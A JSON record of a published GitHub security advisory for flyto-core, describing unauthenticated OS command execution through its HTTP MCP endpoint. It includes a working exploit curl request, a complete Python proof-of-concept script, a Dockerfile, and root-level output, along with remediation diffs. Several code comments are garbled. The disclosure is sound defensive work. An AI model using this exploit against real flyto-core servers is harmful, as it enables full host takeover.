@@ -1,0 +1,155 @@
+{
+  "ghsa_id": "GHSA-h9f9-h6gm-wc85",
+  "cve_id": "CVE-2026-55786",
+  "url": "https://api.github.com/repos/flytohub/flyto-core/security-advisories/GHSA-h9f9-h6gm-wc85",
+  "html_url": "https://github.com/flytohub/flyto-core/security/advisories/GHSA-h9f9-h6gm-wc85",
+  "summary": "Unauthenticated Command Execution via HTTP MCP `execute_module`",
+  "description": "## Unauthenticated Command Execution via HTTP MCP `execute_module`\r\n\r\n### Summary\r\n\r\nThe HTTP MCP endpoint (`POST /mcp`) in flyto-core accepts unauthenticated JSON-RPC `tools/call` requests and dispatches them to arbitrary registered modules, including `sandbox.execute_shell`, which passes attacker-controlled input directly to `asyncio.create_subprocess_shell`. An unauthenticated attacker can execute arbitrary OS commands as the flyto-core server process. By default the server binds to `127.0.0.1`, making this a High-severity local vulnerability (CVSS 8.4); if started with `--host 0.0.0.0`, it becomes remotely exploitable over the network. Dynamic reproduction confirmed command execution as `root` inside a Docker container without any `Authorization` header.\r\n\r\n### Details\r\n\r\nflyto-core exposes an HTTP API via FastAPI. When the API is started (`flyto serve`), the MCP router is unconditionally mounted at `/mcp` (`src/core/api/server.py:75-78`). The route handler at `src/core/api/routes/mcp.py:65-66` declares `@router.post(\"\")` with **no** `Depends(require_auth)` dependency, unlike the analogous REST execution routes (`src/core/api/routes/modules.py:93`) which enforce both authentication and a module denylist.\r\n\r\nThe complete unauthenticated data flow from source to sink:\r\n\r\n1. **`src/core/api/server.py:75-78`** — `mcp_router` is mounted under `/mcp` unconditionally at app creation.\r\n2. **`src/core/api/routes/mcp.py:65-66`** — `@router.post(\"\")` has no `Depends(require_auth)` guard; any HTTP client may POST to this route.\r\n3. **`src/core/api/routes/mcp.py:79`** — the full request body (attacker-controlled JSON) is parsed without validation.\r\n4. **`src/core/api/routes/mcp.py:103-104`** — each JSON-RPC item is forwarded to `handle_jsonrpc_request` without a `module_filter`.\r\n5. **`src/core/mcp_handler.py:813-838`** — `tools/call` with name `execute_module` forwards attacker-controlled `module_id` and `params` to `execute_module()`.\r\n6. **`src/core/mcp_handler.py:180`, `214-215`** — the module registry resolves `module_id` and invokes it with attacker-supplied `params`.\r\n7. **`src/core/modules/registry/decorators.py:96-101`** — the function wrapper exposes `self.params` as `context['params']`.\r\n8. **`src/core/modules/atomic/sandbox/execute_shell.py:137-139`** — `command` is read directly from `params` with no sanitization.\r\n9. **`src/core/modules/atomic/sandbox/execute_shell.py:163-169`** — `command` reaches `asyncio.create_subprocess_shell` with `shell=True` and no allowlist or escaping.\r\n\r\nThe `sandbox.execute_shell` module is not covered by the default denylist (`_DEFAULT_DENYLIST = [\"shell.*\", \"process.*\"]` at `src/core/api/security.py:126`), so even if `module_filter` were applied it would still be reachable.\r\n\r\n**Vulnerable code excerpts:**\r\n\r\n```python\r\n# src/core/api/routes/mcp.py:65-66  — missing auth\r\n@router.post(\"\")\r\nasync def mcp_post(request: Request):\r\n```\r\n\r\n```python\r\n# src/core/mcp_handler.py:832-838  — attacker-controlled dispatch\r\nelif tool_name == \"execute_module\":\r\n    result = await execute_module(\r\n        module_id=arguments.get(\"module_id\", \"\"),\r\n        params=arguments.get(\"params\", {}),\r\n        context=arguments.get(\"context\"),\r\n        browser_sessions=browser_sessions,\r\n    )\r\n```\r\n\r\n```python\r\n# src/core/modules/atomic/sandbox/execute_shell.py:137-169  — sink\r\nparams = context['params']\r\ncommand = params.get('command', '')\r\n# ... only empty-command and cwd existence checks ...\r\nproc = await asyncio.create_subprocess_shell(command, ...)\r\n```\r\n\r\n**Contrast with the protected REST route:**\r\n\r\n```python\r\n# src/core/api/routes/modules.py:93  — correctly guarded\r\n@router.post(\"/execute\", dependencies=[Depends(require_auth)])\r\n```\r\n\r\nThe existence of authentication on the REST execution routes demonstrates that a security boundary was intended; the MCP route simply omits it.\r\n\r\n### PoC\r\n\r\n**Environment setup (Docker):**\r\n\r\n```bash\r\n# Build the image (context: the report directory containing repo/ and vuln-001/)\r\ndocker build \\\r\n  -f vuln-001/Dockerfile \\\r\n  -t flyto-vuln-001 \\\r\n  reports/mcp_57_flytohub__flyto-core/\r\n\r\n# Start the server (binds 0.0.0.0:8333 inside the container)\r\ndocker run --rm -d \\\r\n  -p 127.0.0.1:8333:8333 \\\r\n  --name flyto-vuln-001-test \\\r\n  flyto-vuln-001\r\n```\r\n\r\n**Exploit (curl) — no Authorization header:**\r\n\r\n```bash\r\ncurl -sS http://127.0.0.1:8333/mcp \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\r\n    \"jsonrpc\": \"2.0\",\r\n    \"id\": 1,\r\n    \"method\": \"tools/call\",\r\n    \"params\": {\r\n      \"name\": \"execute_module\",\r\n      \"arguments\": {\r\n        \"module_id\": \"sandbox.execute_shell\",\r\n        \"params\": {\"command\": \"id\", \"timeout\": 5}\r\n      }\r\n    }\r\n  }'\r\n```\r\n\r\n**Exploit (Python PoC script):**\r\n\r\n```bash\r\npython3 vuln-001/poc.py \\\r\n  --host 127.0.0.1 --port 8333 --command id\r\n```\r\n\r\n**Observed response (dynamic reproduction, Phase 2):**\r\n\r\n```json\r\n{\r\n  \"jsonrpc\": \"2.0\",\r\n  \"id\": 1,\r\n  \"result\": {\r\n    \"structuredContent\": {\r\n      \"ok\": true,\r\n      \"data\": {\r\n        \"stdout\": \"uid=0(root) gid=0(root) groups=0(root)\\n\",\r\n        \"stderr\": \"\",\r\n        \"exit_code\": 0,\r\n        \"execution_time_ms\": 4.84\r\n      }\r\n    },\r\n    \"isError\": false\r\n  }\r\n}\r\n```\r\n\r\nThe `uid=0(root)` output confirms arbitrary OS command execution without any authentication. The HTTP response status was `200 OK`.\r\n\r\n**Network-accessible variant:**\r\n\r\nIf the operator starts flyto-core with `--host 0.0.0.0` (as the Dockerfile does for demonstration), the same request is reachable from any network host, changing the attack vector from Local to Network.\r\n\r\n**Recommended remediation:**\r\n\r\n```diff\r\n--- a/src/core/api/routes/mcp.py\r\n+++ b/src/core/api/routes/mcp.py\r\n-from fastapi import APIRouter, Request\r\n+from fastapi import APIRouter, Depends, Request\r\n from fastapi.responses import JSONResponse, Response\r\n from core.mcp_handler import handle_jsonrpc_request\r\n+from core.api.security import require_auth, module_filter\r\n\r\n-@router.post(\"\")\r\n+@router.post(\"\", dependencies=[Depends(require_auth)])\r\n async def mcp_post(request: Request):\r\n         result = await handle_jsonrpc_request(item, browser_sessions)\r\n+        result = await handle_jsonrpc_request(item, browser_sessions, module_filter=module_filter)\r\n\r\n-@router.delete(\"\")\r\n+@router.delete(\"\", dependencies=[Depends(require_auth)])\r\n async def mcp_delete(request: Request):\r\n```\r\n\r\n```diff\r\n--- a/src/core/api/security.py\r\n+++ b/src/core/api/security.py\r\n-_DEFAULT_DENYLIST = [\"shell.*\", \"process.*\"]\r\n+_DEFAULT_DENYLIST = [\"shell.*\", \"process.*\", \"sandbox.*\"]\r\n```\r\n\r\n### Impact\r\n\r\nThis is an **unauthenticated OS command injection** vulnerability. Any process that can reach the `POST /mcp` HTTP endpoint (locally by default, or remotely if the server is bound to a non-loopback interface) can execute arbitrary shell commands with the full privileges of the flyto-core server process. In the dynamic reproduction, the server ran as `root`, meaning full system compromise is possible.\r\n\r\nAffected parties include:\r\n\r\n- **Developers and local users** running `flyto serve` on their workstations — any other local process (e.g., malicious code in a browser tab or another installed application) can pivot through the loopback interface.\r\n- **Infrastructure operators** who expose the API on a non-loopback interface (`--host 0.0.0.0`) without network-level access controls — the attack surface becomes the entire network.\r\n\r\nPotential consequences include arbitrary file read/write, credential exfiltration, lateral movement, and full host takeover.\r\n\r\n### Reproduction artifacts\r\n\r\n#### `Dockerfile`\r\n\r\n```dockerfile\r\nFROM python:3.12-slim\r\n\r\n# lxml buildtext requiredtext whentext text\r\nRUN apt-get update && apt-get install -y --no-install-recommends \\\r\n    gcc g++ libxml2-dev libxslt1-dev \\\r\n    && rm -rf /var/lib/apt/lists/*\r\n\r\nWORKDIR /app\r\n\r\n# local repo copy source (build context: mcp_57_flytohub__flyto-core/)\r\nCOPY repo/ /app/repo/\r\n\r\n# flyto-core[api] install (fastapi + uvicorn contains)\r\nRUN pip install --no-cache-dir \"/app/repo[api]\"\r\n\r\nEXPOSE 8333\r\n\r\n# container externalfrom accessibletext 0.0.0.0 binding\r\nCMD [\"python\", \"-c\", \"from core.api.server import main; main(host='0.0.0.0', port=8333)\"]\r\n```\r\n\r\n#### `poc.py`\r\n\r\n```python\r\n#!/usr/bin/env python3\r\n\"\"\"\r\nVULN-001 PoC: Unauthenticated Command Execution via HTTP MCP execute_module\r\n\r\nTarget:  flyto-core 2.26.2\r\nRoute:   POST /mcp  (no auth dependency — mcp.py:65)\r\nSink:    asyncio.create_subprocess_shell  (execute_shell.py:163)\r\nCWE:     CWE-306 Missing Authentication for Critical Function\r\n\r\nUsage:\r\n    python3 poc.py [--host 127.0.0.1] [--port 8333] [--command id]\r\n\"\"\"\r\nimport sys\r\nimport time\r\nimport json\r\nimport argparse\r\nimport urllib.request\r\nimport urllib.error\r\n\r\n\r\ndef wait_for_server(base_url: str, max_wait: int = 45) -> bool:\r\n    \"\"\"servertext readytext until /health text.\"\"\"\r\n    for i in range(max_wait):\r\n        try:\r\n            with urllib.request.urlopen(f\"{base_url}/health\", timeout=2) as resp:\r\n                if resp.status == 200:\r\n                    print(f\"[+] server is ready ({i}s textand)\")\r\n                    return True\r\n        except Exception:\r\n            pass\r\n        time.sleep(1)\r\n        if i % 5 == 4:\r\n            print(f\"[*] wait in progress... ({i+1}s)\")\r\n    return False\r\n\r\n\r\ndef send_exploit(base_url: str, command: str) -> dict:\r\n    \"\"\"without authentication POST /mcptext arbitrary command execute request.\"\"\"\r\n    payload = {\r\n        \"jsonrpc\": \"2.0\",\r\n        \"id\": 1,\r\n        \"method\": \"tools/call\",\r\n        \"params\": {\r\n            \"name\": \"execute_module\",\r\n            \"arguments\": {\r\n                \"module_id\": \"sandbox.execute_shell\",\r\n                \"params\": {\r\n                    \"command\": command,\r\n                    \"timeout\": 10\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    data = json.dumps(payload).encode(\"utf-8\")\r\n    req = urllib.request.Request(\r\n        f\"{base_url}/mcp\",\r\n        data=data,\r\n        headers={\"Content-Type\": \"application/json\"},\r\n        method=\"POST\",\r\n    )\r\n\r\n    with urllib.request.urlopen(req, timeout=20) as resp:\r\n        body = resp.read().decode(\"utf-8\")\r\n\r\n    return json.loads(body)\r\n\r\n\r\ndef main():\r\n    parser = argparse.ArgumentParser(description=\"VULN-001 PoC — flyto-core unauthenticated RCE via MCP\")\r\n    parser.add_argument(\"--host\", default=\"127.0.0.1\")\r\n    parser.add_argument(\"--port\", type=int, default=8333)\r\n    parser.add_argument(\"--command\", default=\"id\", help=\"OS command to execute (default: id)\")\r\n    args = parser.parse_args()\r\n\r\n    base_url = f\"http://{args.host}:{args.port}\"\r\n\r\n    print(\"=\" * 60)\r\n    print(\"VULN-001: Unauthenticated RCE via HTTP MCP execute_module\")\r\n    print(f\"  Target  : {base_url}/mcp\")\r\n    print(f\"  Command : {args.command}\")\r\n    print(\"=\" * 60)\r\n    print()\r\n\r\n    # 1. wait for server readiness\r\n    print(\"[*] waiting for server startup in progress...\")\r\n    if not wait_for_server(base_url):\r\n        print(\"[-] FAIL: servertext whenbetween within not respond not\")\r\n        sys.exit(1)\r\n\r\n    # 2. without authentication exploit send request\r\n    print(f\"\\n[*] POST {base_url}/mcp — without an Authorization header send\")\r\n    try:\r\n        result = send_exploit(base_url, args.command)\r\n    except urllib.error.HTTPError as e:\r\n        body = e.read().decode(\"utf-8\", errors=\"replace\")\r\n        print(f\"[-] HTTP {e.code}: {body}\")\r\n        print(\"[-] FAIL: servertext requesttext rejected (vulnerability none or text textdone)\")\r\n        sys.exit(1)\r\n    except Exception as e:\r\n        print(f\"[-] text error: {e}\")\r\n        sys.exit(1)\r\n\r\n    # 3. response parse\r\n    print(f\"\\n[*] Raw JSON response:\\n{json.dumps(result, indent=2, ensure_ascii=False)}\\n\")\r\n\r\n    # result.result.structuredContent.data.stdout\r\n    try:\r\n        structured = result[\"result\"][\"structuredContent\"]\r\n        data = structured[\"data\"]\r\n        stdout = data.get(\"stdout\", \"\")\r\n        stderr = data.get(\"stderr\", \"\")\r\n        exit_code = data.get(\"exit_code\", -1)\r\n    except (KeyError, TypeError) as e:\r\n        print(f\"[-] FAIL: expected response structure text — {e}\")\r\n        print(f\"    result keys: {list(result.get('result', {}).keys())}\")\r\n        sys.exit(1)\r\n\r\n    print(f\"[*] exit_code = {exit_code}\")\r\n    print(f\"[*] stdout    = {stdout!r}\")\r\n    print(f\"[*] stderr    = {stderr!r}\")\r\n    print()\r\n\r\n    # 4. success verdict: `id` command resulttext uid= contains whether\r\n    if \"uid=\" in stdout:\r\n        print(\"[+] ============================================================\")\r\n        print(\"[+] PASS: without authentication text OS command execution check!\")\r\n        print(f\"[+] command output: {stdout.strip()}\")\r\n        print(\"[+] ============================================================\")\r\n        sys.exit(0)\r\n    else:\r\n        print(\"[-] FAIL: stdouttext 'uid=' none — commandtext executenot text outputtext different\")\r\n        sys.exit(1)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n```",
+  "severity": "high",
+  "author": null,
+  "publisher": {
+    "login": "ChesterHsu",
+    "id": 49779818,
+    "node_id": "MDQ6VXNlcjQ5Nzc5ODE4",
+    "avatar_url": "https://avatars.githubusercontent.com/u/49779818?v=4",
+    "gravatar_id": "",
+    "url": "https://api.github.com/users/ChesterHsu",
+    "html_url": "https://github.com/ChesterHsu",
+    "followers_url": "https://api.github.com/users/ChesterHsu/followers",
+    "following_url": "https://api.github.com/users/ChesterHsu/following{/other_user}",
+    "gists_url": "https://api.github.com/users/ChesterHsu/gists{/gist_id}",
+    "starred_url": "https://api.github.com/users/ChesterHsu/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/ChesterHsu/subscriptions",
+    "organizations_url": "https://api.github.com/users/ChesterHsu/orgs",
+    "repos_url": "https://api.github.com/users/ChesterHsu/repos",
+    "events_url": "https://api.github.com/users/ChesterHsu/events{/privacy}",
+    "received_events_url": "https://api.github.com/users/ChesterHsu/received_events",
+    "type": "User",
+    "user_view_type": "public",
+    "site_admin": false
+  },
+  "identifiers": [
+    {
+      "value": "GHSA-h9f9-h6gm-wc85",
+      "type": "GHSA"
+    },
+    {
+      "value": "CVE-2026-55786",
+      "type": "CVE"
+    }
+  ],
+  "state": "published",
+  "created_at": null,
+  "updated_at": "2026-06-17T16:42:39Z",
+  "published_at": "2026-05-30T13:06:14Z",
+  "closed_at": null,
+  "withdrawn_at": null,
+  "submission": null,
+  "vulnerabilities": [
+    {
+      "package": {
+        "ecosystem": "pip",
+        "name": "flyto-core"
+      },
+      "vulnerable_version_range": ">= 2.26.2, < 2.26.4",
+      "patched_versions": "2.26.4",
+      "vulnerable_functions": [
+
+      ]
+    }
+  ],
+  "cvss_severities": {
+    "cvss_v3": {
+      "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "score": 8.4
+    },
+    "cvss_v4": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  "cwes": [
+    {
+      "cwe_id": "CWE-78",
+      "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+    },
+    {
+      "cwe_id": "CWE-306",
+      "name": "Missing Authentication for Critical Function"
+    }
+  ],
+  "cwe_ids": [
+    "CWE-78",
+    "CWE-306"
+  ],
+  "credits": [
+    {
+      "login": "EQSTLab",
+      "type": "reporter"
+    },
+    {
+      "login": "yym8538",
+      "type": "analyst"
+    }
+  ],
+  "credits_detailed": [
+    {
+      "user": {
+        "login": "EQSTLab",
+        "id": 148991397,
+        "node_id": "U_kgDOCOFtpQ",
+        "avatar_url": "https://avatars.githubusercontent.com/u/148991397?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/EQSTLab",
+        "html_url": "https://github.com/EQSTLab",
+        "followers_url": "https://api.github.com/users/EQSTLab/followers",
+        "following_url": "https://api.github.com/users/EQSTLab/following{/other_user}",
+        "gists_url": "https://api.github.com/users/EQSTLab/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/EQSTLab/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/EQSTLab/subscriptions",
+        "organizations_url": "https://api.github.com/users/EQSTLab/orgs",
+        "repos_url": "https://api.github.com/users/EQSTLab/repos",
+        "events_url": "https://api.github.com/users/EQSTLab/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/EQSTLab/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter",
+      "state": "accepted"
+    },
+    {
+      "user": {
+        "login": "yym8538",
+        "id": 180361321,
+        "node_id": "U_kgDOCsAYaQ",
+        "avatar_url": "https://avatars.githubusercontent.com/u/180361321?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/yym8538",
+        "html_url": "https://github.com/yym8538",
+        "followers_url": "https://api.github.com/users/yym8538/followers",
+        "following_url": "https://api.github.com/users/yym8538/following{/other_user}",
+        "gists_url": "https://api.github.com/users/yym8538/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/yym8538/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/yym8538/subscriptions",
+        "organizations_url": "https://api.github.com/users/yym8538/orgs",
+        "repos_url": "https://api.github.com/users/yym8538/repos",
+        "events_url": "https://api.github.com/users/yym8538/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/yym8538/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "analyst",
+      "state": "accepted"
+    }
+  ],
+  "collaborating_users": null,
+  "collaborating_teams": null,
+  "private_fork": null,
+  "comments": 1,
+  "cvss": {
+    "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "score": 8.4
+  }
+}
